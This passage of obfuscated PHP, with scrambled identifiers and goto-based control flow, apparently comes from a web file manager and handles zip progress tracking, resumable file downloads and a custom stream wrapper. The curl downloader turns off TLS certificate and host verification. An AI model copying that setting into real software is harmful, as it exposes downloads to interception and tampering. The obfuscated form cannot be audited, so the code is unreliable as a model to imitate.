($EÎ•ôá›î[$f«¿‡ºòÚœ[1475]] + $aˆÅøğ—à) / $EÎ•ôá›î[$f«¿‡ºòÚœ[688]]; $EÎ•ôá›î[$f«¿‡ºòÚœ[1426]] = 0.3 + 0.4 + $f¨š¯ù® * 0.3; } } } if ($EÎ•ôá›î[$f«¿‡ºòÚœ[1426]] > 0) { $CñéÄòå£³ = timeFloat() - $EÎ•ôá›î[$f«¿‡ºòÚœ[1428]] - $EÎ•ôá›î[$f«¿‡ºòÚœ[1431]]; $EÎ•ôá›î[$f«¿‡ºòÚœ[1432]] = $CñéÄòå£³ * (1 - $EÎ•ôá›î[$f«¿‡ºòÚœ[1426]]) / $EÎ•ôá›î[$f«¿‡ºòÚœ[1426]]; } } public function addFile($d¢Â‹¥å–) { goto B×Õ­ßÆ¦; B÷ª¥÷ì´ì: $FÇÊÑˆ…’—[$bøÈ…á ¼[963]] = 1; $FìÄÚ»¡Ş = 0; $FÇÊÑˆ…’—[$bøÈ…á ¼[1479]] = array($bøÈ…á ¼[1480] => $FìÄÚ»¡Ş + 1, $bøÈ…á ¼[398] => $e‰¤ˆ¹ÅÒå[$bøÈ…á ¼[38]], $bøÈ…á ¼[85] => $e‰¤ˆ¹ÅÒå[$bøÈ…á ¼[85]], $bøÈ…á ¼[479] => $e‰¤ˆ¹ÅÒå[$bøÈ…á ¼[479]] ? $e‰¤ˆ¹ÅÒå[$bøÈ…á ¼[479]] : $e‰¤ˆ¹ÅÒå[$bøÈ…á ¼[85]]); goto BµİÜÄ×ñÅ; aßèçºÖ×¦: $FÇÊÑˆ…’—[$bøÈ…á ¼[1468]] = $e‰¤ˆ¹ÅÒå[$bøÈ…á ¼[38]]; $FÇÊÑˆ…’—[$bøÈ…á ¼[1470]] = $e‰¤ˆ¹ÅÒå[$bøÈ…á ¼[87]]; $FÇÊÑˆ…’—[$bøÈ…á ¼[1471]] = 0; goto Aê×“ºËÛ´; B×Õ­ßÆ¦: $bøÈ…á ¼ =& $_SERVER[¨¤¼…´]; $FÇÊÑˆ…’— =& $this->task; $e‰¤ˆ¹ÅÒå = IO::info($d¢Â‹¥å–); goto aßèçºÖ×¦; Aê×“ºËÛ´: $FÇÊÑˆ…’—[$bøÈ…á ¼[965]] = $bøÈ…á ¼[1487]; $FÇÊÑˆ…’—[$bøÈ…á ¼[1472]] = $bøÈ…á ¼[1031]; $FÇÊÑˆ…’—[$bøÈ…á ¼[688]] = $e‰¤ˆ¹ÅÒå[$bøÈ…á ¼[87]]; goto B÷ª¥÷ì´ì; BµİÜÄ×ñÅ: $this->update(); goto B¡³¶ø½‡ï; B¡³¶ø½‡ï: } public function unzipAfter($e¶óÊÊ“») { goto dÀï®âÑ¬‰; AºÑ¸’´ù¨: if ($aˆèñä •¾[$aÉ§‚Ù‰ª¯[39]] == $aÉ§‚Ù‰ª¯[181]) { $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[963]] = 1; } else { $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[963]] = $aˆèñä •¾[$aÉ§‚Ù‰ª¯[90]][$aÉ§‚Ù‰ª¯[88]]; } $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[965]] = $aÉ§‚Ù‰ª¯[43]; $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[1472]] = 0; goto f„‘ºˆâªË; e˜Â¨Šõ’: $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[1468]] = $aÉ§‚Ù‰ª¯[43]; $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[1475]] = 0; $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[688]] = $aˆèñä •¾[$aÉ§‚Ù‰ª¯[87]]; goto eäŸ†˜‚ö¹; eäŸ†˜‚ö¹: $this->update(); self::log($aÉ§‚Ù‰ª¯[1500] . json_encode(array($e¤ó°ê¡ËŒ, $aˆèñä •¾))); goto bÏæ„æ‘ªœ; f„‘ºˆâªË: $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[977]] = 0; $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[1470]] = 0; $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[1471]] = 0; goto e˜Â¨Šõ’; dÀï®âÑ¬‰: $aÉ§‚Ù‰ª¯ =& $_SERVER[¨¤¼…´]; $e¤ó°ê¡ËŒ =& $this->task; $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[1498]] = $aÉ§‚Ù‰ª¯[113]; goto cÑ›Î£ë¬â; cÑ›Î£ë¬â: $aˆèñä •¾ = IO::infoWithChildren($e¶óÊÊ“»); $CˆÚ²ÀÈ‹ = 0; $e¤ó°ê¡ËŒ[$aÉ§‚Ù‰ª¯[1479]] = array($aÉ§‚Ù‰ª¯[1480] => $CˆÚ²ÀÈ‹ + 1, $aÉ§‚Ù‰ª¯[398] => $aˆèñä •¾[$aÉ§‚Ù‰ª¯[38]], $aÉ§‚Ù‰ª¯[85] => $aˆèñä •¾[$aÉ§‚Ù‰ª¯[85]], $aÉ§‚Ù‰ª¯[479] => $aˆèñä •¾[$aÉ§‚Ù‰ª¯[479]] ? $aˆèñä •¾[$aÉ§‚Ù‰ª¯[479]] : $aˆèñä •¾[$aÉ§‚Ù‰ª¯[85]]); goto AºÑ¸’´ù¨; bÏæ„æ‘ªœ: } public function nameParse($DŞ„­ª´Õê) { goto aÚß«Ê–¿‚; f„Œ”Ï·ÅŞ: $this->update(); goto CˆÁñˆšíæ; fœˆšä¸ã: $d—Á’¾ä—õ = get_path_this($DŞ„­ª´Õê); if (strstr($d—Á’¾ä—õ, $Bç‡¯ÖÖÔ…[101])) { $B‘Ô…ÏæõÃ[$Bç‡¯ÖÖÔ…[977]] += 1; $B‘Ô…ÏæõÃ[$Bç‡¯ÖÖÔ…[963]] += 1; } $B‘Ô…ÏæõÃ[$Bç‡¯ÖÖÔ…[1468]] = $DŞ„­ª´Õê; goto f„Œ”Ï·ÅŞ; aÚß«Ê–¿‚: $Bç‡¯ÖÖÔ… =& $_SERVER[¨¤¼…´]; $B‘Ô…ÏæõÃ =& $this->task; if ($B‘Ô…ÏæõÃ[$Bç‡¯ÖÖÔ…[1498]] == $Bç‡¯ÖÖÔ…[1031]) { $B‘Ô…ÏæõÃ[$Bç‡¯ÖÖÔ…[1498]] = $Bç‡¯ÖÖÔ…[314]; $B‘Ô…ÏæõÃ[$Bç‡¯ÖÖÔ…[1475]] = 0; $B‘Ô…ÏæõÃ[$Bç‡¯ÖÖÔ…[688]] = 0; } goto fœˆšä¸ã; CˆÁñˆšíæ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $E¤Ã²ë«½É =& $_SERVER[¨¤¼…´]; parent::startAfter(); Hook::bind($E¤Ã²ë«½É[1501], array($this, $E¤Ã²ë«½É[1496])); $a„â¸‹Ë‰ï =& $this->task; $a„â¸‹Ë‰ï[$E¤Ã²ë«½É[1498]] = $E¤Ã²ë«½É[1031]; if (!$a„â¸‹Ë‰ï[$E¤Ã²ë«½É[1331]]) { $a„â¸‹Ë‰ï[$E¤Ã²ë«½É[1331]] = LNG($E¤Ã²ë«½É[1502]); } } protected function endAfter() { $FÉŒîÇ”ç =& $_SERVER[¨¤¼…´]; parent::endAfter(); Hook::unbind($FÉŒîÇ”ç[1501], array($this, $FÉŒîÇ”ç[1496])); } public function updateAfter() { $aÉíÍó‹™ù =& $_SERVER[¨¤¼…´]; $aµÎŠµãÎ» =& $this->task; if (!$aµÎŠµãÎ»[$aÉíÍó‹™ù[963]] || !$aµÎŠµãÎ»[$aÉíÍó‹™ù[688]]) { return; } if ($aµÎŠµãÎ»[$aÉíÍó‹™ù[1498]] == $aÉíÍó‹™ù[1031]) { $Dñì»‹»¨ = $aµÎŠµãÎ»[$aÉíÍó‹™ù[1471]]; if ($aµÎŠµãÎ»[$aÉíÍó‹™ù[1472]] != $aÉíÍó‹™ù[1031]) { $Dñì»‹»¨ = 0; } $DËÃèÊ‰Ğ = ($aµÎŠµãÎ»[$aÉíÍó‹™ù[1475]] + $Dñì»‹»¨) / $aµÎŠµãÎ»[$aÉíÍó‹™ù[688]]; $aµÎŠµãÎ»[$aÉíÍó‹™ù[1426]] = $DËÃèÊ‰Ğ * 0.3; } else { if ($aµÎŠµãÎ»[$aÉíÍó‹™ù[1498]] == $aÉíÍó‹™ù[314]) { $DËÃèÊ‰Ğ = $aµÎŠµãÎ»[$aÉíÍó‹™ù[977]] / $aµÎŠµãÎ»[$aÉíÍó‹™ù[963]]; $aµÎŠµãÎ»[$aÉíÍó‹™ù[1426]] = 0.3 + $DËÃèÊ‰Ğ * 0.5; } else { if ($aµÎŠµãÎ»[$aÉíÍó‹™ù[1498]] == $aÉíÍó‹™ù[113]) { $DËÃèÊ‰Ğ = 0; if ($aµÎŠµãÎ»[$aÉíÍó‹™ù[1470]]) { $DËÃèÊ‰Ğ = $aµÎŠµãÎ»[$aÉíÍó‹™ù[1471]] / $aµÎŠµãÎ»[$aÉíÍó‹™ù[1470]]; } $aµÎŠµãÎ»[$aÉíÍó‹™ù[1426]] = 0.3 + 0.5 + $DËÃèÊ‰Ğ * 0.2; } } } if ($aµÎŠµãÎ»[$aÉíÍó‹™ù[1426]] > 0) { $CŒç—óİ‘‹ = timeFloat() - $aµÎŠµãÎ»[$aÉíÍó‹™ù[1428]] - $aµÎŠµãÎ»[$aÉíÍó‹™ù[1431]]; $aµÎŠµãÎ»[$aÉíÍó‹™ù[1432]] = $CŒç—óİ‘‹ * (1 - $aµÎŠµãÎ»[$aÉíÍó‹™ù[1426]]) / $aµÎŠµãÎ»[$aÉíÍó‹™ù[1426]]; } } public function copyFileStart($aª” ‚èèê, $BŞàÀŞŞØ, $Eò÷øÜ¦òÏ, $bˆĞÓ¤ºƒá, $fŠ¹³“Ê, $D ¸¥‚Ãñ£) { $A•¬‹×îæÅ =& $_SERVER[¨¤¼…´]; parent::copyFileStart($aª” ‚èèê, $BŞàÀŞŞØ, $Eò÷øÜ¦òÏ, $bˆĞÓ¤ºƒá, $fŠ¹³“Ê, $D ¸¥‚Ãñ£); $C¿Ş®¯‘çÕ =& $this->task; if ($C¿Ş®¯‘çÕ[$A•¬‹×îæÅ[1498]] == $A•¬‹×îæÅ[314]) { $C¿Ş®¯‘çÕ[$A•¬‹×îæÅ[1498]] = $A•¬‹×îæÅ[113]; } $this->update(); } public function copyFileEnd($c…äÒ‰´, $DáÓ‡Œ‚ñ, $AçĞ¼ß÷Ã˜, $cùÖ¬„½, $bèĞõ‰–§, $c¡¿ÉŸ¡¢Š) { $CÛšñØÏº¡ =& $_SERVER[¨¤¼…´]; $FÕƒç‹“µ =& $this->task; $FÕƒç‹“µ[$CÛšñØÏº¡[1471]] = $FÕƒç‹“µ[$CÛšñØÏº¡[1470]]; $FÕƒç‹“µ[$CÛšñØÏº¡[1475]] += $FÕƒç‹“µ[$CÛšñØÏº¡[1470]]; $FÕƒç‹“µ[$CÛšñØÏº¡[1472]] = $CÛšñØÏº¡[43]; $this->update(); } public function nameParse($FÏ‘ïİƒÜ) { $c¾™ìæÔ—ø =& $_SERVER[¨¤¼…´]; $bâ¢´Ù¢Ê„ =& $this->task; if ($bâ¢´Ù¢Ê„[$c¾™ìæÔ—ø[977]] < $bâ¢´Ù¢Ê„[$c¾™ìæÔ—ø[963]]) { $FğÏÕ¦ª¦Ù = get_path_this($FÏ‘ïİƒÜ); if (strstr($FğÏÕ¦ª¦Ù, $c¾™ìæÔ—ø[101])) { $bâ¢´Ù¢Ê„[$c¾™ìæÔ—ø[977]] += 1; } } if ($bâ¢´Ù¢Ê„[$c¾™ìæÔ—ø[1498]] == $c¾™ìæÔ—ø[1031]) { $bâ¢´Ù¢Ê„[$c¾™ìæÔ—ø[1498]] = $c¾™ìæÔ—ø[314]; } $bâ¢´Ù¢Ê„[$c¾™ìæÔ—ø[1468]] = $FÏ‘ïİƒÜ; $this->update(); } } class Downloader { static function start($D˜’ŞßÄ«‚, $cš¥øê»œò, $cåçÌˆ’ = 10) { goto aò×¨Ç; e‰¿¸›´…²: if (is_file($E½©Âè‚¾¥)) { $Dì’óå‡˜º = file_get_contents($E½©Âè‚¾¥); $bÓµ‘‹¶øÒ = json_decode($Dì’óå‡˜º, 1); } if (file_exists($cš¥øê»œò) && $bĞçĞÈºŸÜ == filesize_64($cš¥øê»œò)) { @unlink($CÅÚßßºä); @unlink($E½©Âè‚¾¥); return array($D‹Šœ—Ù¹[1023] => !0, $D‹Šœ—Ù¹[1025] => $D‹Šœ—Ù¹[1506]); } if ($bÓµ‘‹¶øÒ[$D‹Šœ—Ù¹[338]] != $bĞçĞÈºŸÜ) { $bÓµ‘‹¶øÒ = array($D‹Šœ—Ù¹[338] => $bĞçĞÈºŸÜ); } goto aÔÑáÈ¿·Â; AóºÛ›ù‚•: if ($e—ñ»áàÑ–[$D‹Šœ—Ù¹[1023]]) { @unlink($E½©Âè‚¾¥); } return $e—ñ»áàÑ–; goto déµÖƒ •Ö; aÔÑáÈ¿·Â: if ($Fìáˆ÷—Ø† > $bĞçĞÈºŸÜ) { @unlink($CÅÚßßºä); } file_put_contents($E½©Âè‚¾¥, json_encode($bÓµ‘‹¶øÒ)); $e—ñ»áàÑ– = self::fileDownloadCurl($D˜’ŞßÄ«‚, $cš¥øê»œò, !0, $Fìáˆ÷—Ø†, $bĞçĞÈºŸÜ); goto AóºÛ›ù‚•; Dë‹¾È²œ»: if (!$D˜’ŞßÄ«‚) { return array($D‹Šœ—Ù¹[1023] => !1, $D‹Šœ—Ù¹[1025] => $D‹Šœ—Ù¹[1028]); } if (!$b»ÛªÀ¬†Œ[$D‹Šœ—Ù¹[1277]] || $b»ÛªÀ¬†Œ[$D‹Šœ—Ù¹[338]] == 0) { @unlink($CÅÚßßºä); @unlink($cš¥øê»œò); $e—ñ»áàÑ– = self::fileDownloadFopen($D˜’ŞßÄ«‚, $cš¥øê»œò, $b»ÛªÀ¬†Œ[$D‹Šœ—Ù¹[338]]); if ($e—ñ»áàÑ–[$D‹Šœ—Ù¹[1023]]) { return $e—ñ»áàÑ–; } else { @unlink($CÅÚßßºä); @unlink($cš¥øê»œò); $e—ñ»áàÑ– = self::fileDownloadCurl($D˜’ŞßÄ«‚, $cš¥øê»œò, !1, 0, $b»ÛªÀ¬†Œ[$D‹Šœ—Ù¹[338]]); @unlink($CÅÚßßºä); return $e—ñ»áàÑ–; } } $Fìáˆ÷—Ø† = is_file($CÅÚßßºä) ? filesize_64($CÅÚßßºä) : 0; goto Còº©„•ã; aò×¨Ç: $D‹Šœ—Ù¹ =& $_SERVER[¨¤¼…´]; if (!request_url_safe($D˜’ŞßÄ«‚)) { return array($D‹Šœ—Ù¹[1023] => !1, $D‹Šœ—Ù¹[1025] => $D‹Šœ—Ù¹[1028]); } $E½©Âè‚¾¥ = $cš¥øê»œò . $D‹Šœ—Ù¹[1503]; goto fÕ¯„è™Ó‚; Còº©„•ã: $bĞçĞÈºŸÜ = intval($b»ÛªÀ¬†Œ[$D‹Šœ—Ù¹[338]]); if (file_exists($CÅÚßßºä) && time() - filemtime($CÅÚßßºä) < 3) { return array($D‹Šœ—Ù¹[1023] => !1, $D‹Šœ—Ù¹[1025] => $D‹Šœ—Ù¹[1505]); } $bÓµ‘‹¶øÒ = array(); goto e‰¿¸›´…²; fÕ¯„è™Ó‚: $CÅÚßßºä = $cš¥øê»œò . $D‹Šœ—Ù¹[1504]; if (is_array($D˜’ŞßÄ«‚)) { $b»ÛªÀ¬†Œ = $D˜’ŞßÄ«‚; } else { $b»ÛªÀ¬†Œ = url_header($D˜’ŞßÄ«‚); } $D˜’ŞßÄ«‚ = $b»ÛªÀ¬†Œ[$D‹Šœ—Ù¹[308]]; goto Dë‹¾È²œ»; déµÖƒ •Ö: } static function fileDownloadFopen($a¾µ‹¢ÂÜ, $BÊÏçœİ†…, $Aà‡‹³ò¦Ç = 0) { $EÄ²Ïîêİ =& $_SERVER[¨¤¼…´]; @ini_set($EÄ²Ïîêİ[1507], $EÄ²Ïîêİ[1508]); $e¼ºÇ‡¾é¡ = $BÊÏçœİ†… . $EÄ²Ïîêİ[1504]; set_timeout(); @unlink($e¼ºÇ‡¾é¡); if ($e†‰²ƒíÍ = @fopen($a¾µ‹¢ÂÜ, $EÄ²Ïîêİ[1509])) { goto e¥£±óÍ§; e¥£±óÍ§: if (!($EñÜï‰çÂ‚ = @fopen($e¼ºÇ‡¾é¡, $EÄ²Ïîêİ[1510]))) { return array($EÄ²Ïîêİ[1023] => !1, $EÄ²Ïîêİ[1025] => $EÄ²Ïîêİ[1511]); } while (!feof($e†‰²ƒíÍ)) { if (!file_exists($e¼ºÇ‡¾é¡)) { fclose($EñÜï‰çÂ‚); return array($EÄ²Ïîêİ[1023] => !1, $EÄ²Ïîêİ[1025] => $EÄ²Ïîêİ[1512]); } clearstatcache(); if ($Aà‡‹³ò¦Ç > 0 && $Aà‡‹³ò¦Ç == filesize(iconv_system($e¼ºÇ‡¾é¡))) { break; } fwrite($EñÜï‰çÂ‚, fread($e†‰²ƒíÍ, 1024 * 8), 1024 * 8); } fclose($EñÜï‰çÂ‚); goto AÍøù·šİÒ; AÍøù·šİÒ: fclose($e†‰²ƒíÍ); self::checkGzip($e¼ºÇ‡¾é¡); if (!@rename($e¼ºÇ‡¾é¡, $BÊÏçœİ†…)) { usleep(round(rand(0, 1000) * 50)); @unlink($BÊÏçœİ†…); $Fˆ¬»¥²…â = @rename($e¼ºÇ‡¾é¡, $BÊÏçœİ†…); if (!$Fˆ¬»¥²…â) { return array($EÄ²Ïîêİ[1023] => !1, $EÄ²Ïîêİ[1025] => $EÄ²Ïîêİ[1513]); } } goto A·Ù¿ˆÎ‘§; A·Ù¿ˆÎ‘§: return array($EÄ²Ïîêİ[1023] => !0, $EÄ²Ïîêİ[1025] => $EÄ²Ïîêİ[686]); goto dŸ­ììê‡•; dŸ­ììê‡•: } else { return array($EÄ²Ïîêİ[1023] => !1, $EÄ²Ïîêİ[1025] => $EÄ²Ïîêİ[1514]); } } static function fileDownloadCurl($Bê‰±Õ•, $cÛÖ®¶‹™, $dÂ”ëÏ’İŠ = false, $c†šá“ñ×’ = 0, $a‡ÜºÄ¥ = 0) { goto Cš´ÌôâÙ; FÊ‡Á‘êœ: curl_setopt($bĞ¹à‰Šğ§, CURLOPT_USERAGENT, $cæòÁØ¡¼Æ[1508]); $A„±‹ùõ„´ = curl_exec($bĞ¹à‰Šğ§); curl_progress_end($bĞ¹à‰Šğ§); goto BÒÓÔ‡®¬; aÙË÷ÀÅØ: $fÊã¥ÛÑøê = @fopen($a¸ºÎÃ†É´, $cæòÁØ¡¼Æ[967]); if (!$fÊã¥ÛÑøê) { return array($cæòÁØ¡¼Æ[1023] => !1, $cæòÁØ¡¼Æ[1025] => $cæòÁØ¡¼Æ[1515]); } $bĞ¹à‰Šğ§ = curl_init($Bê‰±Õ•); goto ašíÎš¾Ôµ; a½âÖ´Ÿ: if ($b›ËÉÉƒ‚ < $a‡ÜºÄ¥ && $a‡ÜºÄ¥ != 0) { return array($cæòÁØ¡¼Æ[1023] => !1, $cæòÁØ¡¼Æ[1025] => $cæòÁØ¡¼Æ[1505]); } if ($A„±‹ùõ„´ && filesize_64($a¸ºÎÃ†É´) != 0) { self::checkGzip($a¸ºÎÃ†É´); if (!@rename($a¸ºÎÃ†É´, $cÛÖ®¶‹™)) { @unlink($cÛÖ®¶‹™); $A„±‹ùõ„´ = @rename($a¸ºÎÃ†É´, $cÛÖ®¶‹™); if (!$A„±‹ùõ„´) { return array($cæòÁØ¡¼Æ[1023] => !1, $cæòÁØ¡¼Æ[1025] => $cæòÁØ¡¼Æ[1517]); } } return array($cæòÁØ¡¼Æ[1023] => !0, $cæòÁØ¡¼Æ[1025] => $cæòÁØ¡¼Æ[686]); } return array($cæòÁØ¡¼Æ[1023] => !1, $cæòÁØ¡¼Æ[1025] => $cæòÁØ¡¼Æ[1518]); goto FÏ°Á‰Šç‚; ašíÎš¾Ôµ: if ($dÂ”ëÏ’İŠ) { curl_setopt($bĞ¹à‰Šğ§, CURLOPT_RANGE, $c†šá“ñ×’ . $cæòÁØ¡¼Æ[705]); } curl_setopt($bĞ¹à‰Šğ§, CURLOPT_FILE, $fÊã¥ÛÑøê); curl_setopt($bĞ¹à‰Šğ§, CURLOPT_REFERER, get_url_link($Bê‰±Õ•)); goto D÷£Ü‰§ÊŒ; Cš´ÌôâÙ: $cæòÁØ¡¼Æ =& $_SERVER[¨¤¼…´]; $a¸ºÎÃ†É´ = $cÛÖ®¶‹™ . $cæòÁØ¡¼Æ[1504]; set_timeout(); goto aÙË÷ÀÅØ; D÷£Ü‰§ÊŒ: curl_setopt($bĞ¹à‰Šğ§, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($bĞ¹à‰Šğ§, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($bĞ¹à‰Šğ§, CURLOPT_SSL_VERIFYHOST, 0); goto eò‚éáĞŒ; eò‚éáĞŒ: curl_setopt($bĞ¹à‰Šğ§, CURLOPT_NOPROGRESS, !1); curl_setopt($bĞ¹à‰Šğ§, CURLOPT_PROGRESSFUNCTION, $cæòÁØ¡¼Æ[1516]); curl_progress_start($bĞ¹à‰Šğ§); goto FÊ‡Á‘êœ; BÒÓÔ‡®¬: curl_close($bĞ¹à‰Šğ§); fclose($fÊã¥ÛÑøê); $b›ËÉÉƒ‚ = filesize_64(iconv_system($a¸ºÎÃ†É´)); goto a½âÖ´Ÿ; FÏ°Á‰Šç‚: } static function checkGzip($C‡×ê¸ºÔÏ) { goto F÷®Ä†„ëÂ; CÌ˜©¦¹”: ob_start(); readgzfile($C‡×ê¸ºÔÏ); $E†ŒÙ°µÇÓ = ob_get_clean(); goto d“ÊÈã­Öá; F÷®Ä†„ëÂ: $c—Å›Úìö™ = $_SERVER[¨¤¼…´][1519]; $bš»¸ÉëÏ = file_sub_str($C‡×ê¸ºÔÏ, 0, 2); if ($c—Å›Úìö™ != $bš»¸ÉëÏ) { return; } goto CÌ˜©¦¹”; d“ÊÈã­Öá: file_put_contents($C‡×ê¸ºÔÏ, $E†ŒÙ°µÇÓ); goto D•òİñÌ‡—; D•òİñÌ‡—: } } goto f¶º“Œˆ³Ã; a‘‘ÎÇã©ª: class StreamWrapperIO { private $path; private $info; private $pose = 0; static $_chunkBuffer = array(); private $timeStart = 0; function stream_open($FÁá‹Ùæê, $fÅÁ‰Û£³¹ = '') { goto aÓŒÕ¸äŒµ; aÓŒÕ¸äŒµ: $this->info = $this->info($FÁá‹Ùæê); $this->timeStart = timeFloat(); $this->path = $this->info[$_SERVER[¨¤¼…´][85]]; goto dÙÈ’™”®±; a¨ù‰ÊÀÕÙ: return $this->info ? !0 : !1; goto aİêŠ˜; dÙÈ’™”®±: if (!$this->info) { return !1; } if (count(self::$_chunkBuffer) > 100) { self::$_chunkBuffer = null; self::$_chunkBuffer = array(); } if (!isset(self::$_chunkBuffer[$FÁá‹Ùæê])) { self::$_chunkBuffer[$FÁá‹Ùæê] = array(); } goto a¨ù‰ÊÀÕÙ; aİêŠ˜: } function stream_read($cáÒ÷†™æÆ) { $eòÊ¼¥—×¤ = $this->fileSubstr($this->pose, $cáÒ÷†™æÆ); $this->pose += strlen($eòÊ¼¥—×¤); return $eòÊ¼¥—×¤; } public function stream_tell() { return $this->pose; } public function stream_seek($dÁİØš—®, $a¥Í¯¶ŞíØ) { $a²ç†ÜÏ‰ =& $_SERVER[¨¤¼…´]; if ($a¥Í¯¶ŞíØ == SEEK_SET) { $this->pose = $dÁİØš—®; } else { if ($a¥Í¯¶ŞíØ == SEEK_CUR) { $this->pose += $dÁİØš—®; } else { if ($a¥Í¯¶ŞíØ == SEEK_END) { $this->pose = $this->info[$a²ç†ÜÏ‰[87]] + intval($dÁİØš—®); } } } if ($dÁİØš—® < 0) { $this->pose = $this->info[$a²ç†ÜÏ‰[87]] + $dÁİØš—®; } return !0; } public function stream_eof() { return $this->pose >= $this->info[$_SERVER[¨¤¼…´][87]]; } public function stream_close() { return !0; } public function url_stat($eŠç‘î´©ê, $BßëÈ£ñğ‚) { $F‹ò«©ÒóŒ =& $_SERVER[¨¤¼…´]; $cÂ…—İ†–½ = $this->info($eŠç‘î´©ê); return array($F‹ò«©ÒóŒ[1279] => 0, $F‹ò«©ÒóŒ[1280] => 0, $F‹ò«©ÒóŒ[22] => 32768 + 511, $F‹ò«©ÒóŒ[1281] => 0, $F‹ò«©ÒóŒ[1282] => 0, $F‹ò«©ÒóŒ[1283] => 0, $F‹ò«©ÒóŒ[1284] => 0, $F‹ò«©ÒóŒ[87] => $cÂ…—İ†–½[$F‹ò«©ÒóŒ[87]], $F‹ò«©ÒóŒ[1285] => $cÂ…—İ†–½[$F‹ò«©ÒóŒ[1157]], $F‹ò«©ÒóŒ[1243] => $cÂ…—İ†–½[$F‹ò«©ÒóŒ[117]], $F‹ò«©ÒóŒ[1242] => $cÂ…—İ†–½[$F‹ò«©ÒóŒ[201]], $F‹ò«©ÒóŒ[1286] => 0, $F‹ò«©ÒóŒ[1287] => 0); } static $fileInfo = array(); public function info($BŞ™Îäğ¶) { $b‰çÌ“Ï¡ = $_SERVER[¨¤¼…´][1288]; if (isset(self::$fileInfo[$BŞ™Îäğ¶])) { return self::$fileInfo[$BŞ™Îäğ¶]; } if (substr($BŞ™Îäğ¶, 0, strlen($b‰çÌ“Ï¡)) != $b‰çÌ“Ï¡) { return !1; } self::$fileInfo[$BŞ™Îäğ¶] = IO::info(substr($BŞ™Îäğ¶, strlen($b‰çÌ“Ï¡))); return self::$fileInfo[$BŞ™Îäğ¶]; } public static function read($Aˆˆ¹ÒõÆ„, $D‰œØœóİ, $B­ùÅó¶İ±) { goto aäÚ‚Ã”œº; AÁ‡ŞËÛ–: return $C‡ÕÆ·ô–; goto EÃ¤µóŞ¢; aäÚ‚Ã”œº: $a—Œ»¡¯“Ä =& $_SERVER[¨¤¼…´]; $Aö«™ØŸ«¬ = fopen($Aˆˆ¹ÒõÆ„, $a—Œ»¡¯“Ä[1159]); if (!$Aö«™ØŸ«¬) { return $a—Œ»¡¯“Ä[43]; } goto Fš‹“¨’‰•; Fš‹“¨’‰•: $AŒå´ïÔ = 8192; fseek($Aö«™ØŸ«¬, $D‰œØœóİ, SEEK_SET); $C‡ÕÆ·ô– = $a—Œ»¡¯“Ä[43]; goto eÅñÑèË‘¼; eÅñÑèË‘¼: $dÖ¨Ä•ªÕ = 0; while ($dÖ¨Ä•ªÕ < $B­ùÅó¶İ±) { $bá´ùšÕÀã = min($AŒå´ïÔ, $B­ùÅó¶İ± - $dÖ¨Ä•ªÕ); $C‡ÕÆ·ô– .= fread($Aö«™ØŸ«¬, $bá´ùšÕÀã); $dÖ¨Ä•ªÕ += $bá´ùšÕÀã; } fclose($Aö«™ØŸ«¬); goto AÁ‡ŞËÛ–; EÃ¤µóŞ¢: } public function fileSubstr($d°à­µ‡Ôô, $FÌ«¶„ƒŸ) { goto A‰µÏÜ„£; A‰µÏÜ„£: $FêªÅ±ã„É =& $_SERVER[¨¤¼…´]; $A›©µÚõ®æ = $this->info[$FêªÅ±ã„É[87]]; $d…ŸÈ±ÕÍÆ = $d°à­µ‡Ôô; goto f‚¾ÂåÖ²; d®£‘Ç´: if ($d°à­µ‡Ôô + $FÌ«¶„ƒŸ > $A›©µÚõ®æ) { $FÌ«¶„ƒŸ = $A›©µÚõ®æ - $d°à­µ‡Ôô; } if ($FÌ«¶„ƒŸ <= 0) { return $FêªÅ±ã„É[43]; } if ($d°à­µ‡Ôô < 0 || $d°à­µ‡Ôô >= $A›©µÚõ®æ || $FÌ«¶„ƒŸ <= 0 || $FÌ«¶„ƒŸ > 1024 * 1024 * 5) { throw new Exception("\151\x6f\x46\x69\x6c\145\122\x65\x61\x64\40\145\162\162\157\162\41\x20\163\164\141\162\x74\75{$d°à­µ‡Ôô}\73\154\x65\156\147\164\x68\x3d{$FÌ«¶„ƒŸ}\73\x20\163\151\172\x65\x3d{$A›©µÚõ®æ}\73"); } goto a»”Ì¤–×ì; c¬œ˜×«º†: $Aî…Í¸İöÌ = 0; $cãóğˆí… = 0; $e©¤µ±•ƒ‡ = $FêªÅ±ã„É[43]; goto eÊÎŸœä; e¾¹Í¹–Ä±: ksort($c‡Ğ“ò½ˆ); $E˜Áå‡ÏÆß = substr($Bæ˜äÅ«², $d°à­µ‡Ôô - $d´ÊÒá˜ÆÄ, $FÌ«¶„ƒŸ); return $E˜Áå‡ÏÆß; goto dÉ·ùÁ…œ’; a»”Ì¤–×ì: $fÎ¯»ÇØùÀ = 64 * 1024; $c‡Ğ“ò½ˆ =& self::$_chunkBuffer[$this->path]; if (!$c‡Ğ“ò½ˆ) { $c‡Ğ“ò½ˆ = array(); } goto c¬œ˜×«º†; f‚¾ÂåÖ²: $Açì”¡Ø = $FÌ«¶„ƒŸ; if ($d°à­µ‡Ôô < 0) { $d°à­µ‡Ôô = $A›©µÚõ®æ + $d°à­µ‡Ôô; } if ($FÌ«¶„ƒŸ === !1) { $FÌ«¶„ƒŸ = $A›©µÚõ®æ - $d°à­µ‡Ôô; } goto d®£‘Ç´; a÷°ì™™³: $f¥¦¯ÂÄ³ = ceil(($d°à­µ‡Ôô + $FÌ«¶„ƒŸ) / $fÎ¯»ÇØùÀ) * $fÎ¯»ÇØùÀ - $d´ÊÒá˜ÆÄ; $Bæ˜äÅ«² = IO::fileSubstr($this->path, $d´ÊÒá˜ÆÄ, $f¥¦¯ÂÄ³); $c‡Ğ“ò½ˆ[$d´ÊÒá˜ÆÄ . $FêªÅ±ã„É[43]] = $Bæ˜äÅ«²; goto 